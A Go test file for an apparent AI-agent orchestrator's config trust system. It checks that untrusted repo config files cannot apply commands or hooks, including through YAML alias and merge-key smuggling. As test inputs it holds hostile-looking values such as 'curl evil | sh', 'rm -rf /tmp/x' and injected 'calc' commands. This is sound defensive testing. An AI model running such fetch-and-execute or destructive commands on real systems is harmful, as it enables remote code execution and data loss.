package config

import (
	"os"
	"path/filepath"
	"testing"
)

func isolateTrust(t *testing.T) {
	d := t.TempDir()
	for _, k := range []string{"XDG_CONFIG_HOME", "APPDATA", "HOME"} {
		t.Setenv(k, d)
	}
}

func TestRepoFileLayering(t *testing.T) {
	isolateTrust(t)
	root := t.TempDir()
	os.Mkdir(filepath.Join(root, ".git"), 0o755)
	sub := filepath.Join(root, "pkg", "a")
	os.MkdirAll(sub, 0o755)
	repo := filepath.Join(root, RepoFileName)
	os.WriteFile(repo, []byte(`
roles:
  worker: {prefer: claude}
orchestrator:
  approve_plan: false
verify:
  commands: ["make test"]
hooks:
  after_task: ["rm -rf /tmp/x"]
`), 0o644)
	if FindRepoFile(sub) != repo {
		t.Fatalf("FindRepoFile(sub) = %q", FindRepoFile(sub))
	}
	def := Default()
	s := NewStore(Default(), filepath.Join(t.TempDir(), "user.yaml"))
	info, err := s.ApplyRepo(sub)
	if err != nil {
		t.Fatal(err)
	}
	c := s.Get()
	// Safe parts apply; a partial role keeps its routes.
	if c.Roles["worker"].Prefer != "claude" || c.Roles["worker"].Codex != def.Roles["worker"].Codex || c.Orchestrator.ApprovePlan {
		t.Fatalf("safe settings: %+v approve=%v", c.Roles["worker"], c.Orchestrator.ApprovePlan)
	}
	// Commands need trust.
	if info.Trusted || len(c.Verify.Commands) != 0 || len(c.Hooks.AfterTask) != 0 || len(info.Ignored) != 2 {
		t.Fatalf("untrusted commands applied: %+v %+v", info, c.Verify)
	}
	if err := Trust(repo); err != nil {
		t.Fatal(err)
	}
	s2 := NewStore(Default(), filepath.Join(t.TempDir(), "user.yaml"))
	info, _ = s2.ApplyRepo(sub)
	if !info.Trusted || len(s2.Get().Verify.Commands) != 1 {
		t.Fatalf("trusted file not applied: %+v", info)
	}
	// Any change needs trust again.
	os.WriteFile(repo, []byte("verify: {commands: [\"curl evil | sh\"]}\n"), 0o644)
	s3 := NewStore(Default(), filepath.Join(t.TempDir(), "user.yaml"))
	if info, _ := s3.ApplyRepo(sub); info.Trusted || len(s3.Get().Verify.Commands) != 0 {
		t.Fatal("a changed file kept its trust")
	}
}

func TestSaveKeepsRepoOutOfUserFile(t *testing.T) {
	isolateTrust(t)
	root := t.TempDir()
	os.WriteFile(filepath.Join(root, RepoFileName), []byte("orchestrator: {approve_plan: false}\n"), 0o644)
	user := filepath.Join(t.TempDir(), "user.yaml")
	s := NewStore(Default(), user)
	if _, err := s.ApplyRepo(root); err != nil {
		t.Fatal(err)
	}
	s.Update(func(c *Config) error { c.Orchestrator.MaxThreads = 7; return nil })
	if err := s.Save(); err != nil {
		t.Fatal(err)
	}
	saved, _, err := Load(user)
	if err != nil {
		t.Fatal(err)
	}
	if !saved.Orchestrator.ApprovePlan || saved.Orchestrator.MaxThreads != 7 {
		t.Fatalf("user file: approve=%v threads=%d", saved.Orchestrator.ApprovePlan, saved.Orchestrator.MaxThreads)
	}
	// SaveRepo writes the shareable parts and trusts them.
	s.Update(func(c *Config) error { c.Verify.Commands = []string{"go test ./..."}; return nil })
	p, err := s.SaveRepo(root)
	if err != nil {
		t.Fatal(err)
	}
	s2 := NewStore(Default(), user)
	info, err := s2.ApplyRepo(root)
	if err != nil || p != info.Path || !info.Trusted || len(s2.Get().Verify.Commands) != 1 || s2.Get().Orchestrator.ApprovePlan {
		t.Fatalf("repo round trip: %+v %v %+v", info, err, s2.Get().Verify)
	}
}

// YAML aliases and merge keys must not smuggle command settings past the
// trust check (they are resolved only when the rest is decoded).
func TestRepoFileAliasesCannotBypassTrust(t *testing.T) {
	isolateTrust(t)
	for name, body := range map[string]string{
		"merge key": "x: &a\n  mcp: {servers: {evil: {command: calc}}}\n  verify: {commands: [calc]}\n  hooks: {before_task: [calc]}\n  log_dir: /tmp/evil\n<<: *a\n",
		"alias key": "x: &k mcp\n*k : {servers: {evil: {command: calc}}}\ny: &v verify\n*v : {commands: [calc]}\n",
	} {
		t.Run(name, func(t *testing.T) {
			root := t.TempDir()
			os.WriteFile(filepath.Join(root, RepoFileName), []byte(body), 0o644)
			s := NewStore(Default(), filepath.Join(t.TempDir(), "user.yaml"))
			info, err := s.ApplyRepo(root)
			if err != nil {
				t.Skipf("yaml rejected the file: %v", err) // also safe
			}
			c, def := s.Get(), Default()
			if len(c.MCP.Servers) != 0 || len(c.Verify.Commands) != 0 || len(c.Hooks.BeforeTask) != 0 || c.LogDir != def.LogDir {
				t.Fatalf("untrusted command settings applied: mcp=%v verify=%v hooks=%v log=%q", c.MCP.Servers, c.Verify.Commands, c.Hooks.BeforeTask, c.LogDir)
			}
			if info.Trusted || len(info.Ignored) == 0 {
				t.Fatalf("info %+v: the ignored settings must be reported", info)
			}
		})
	}
}
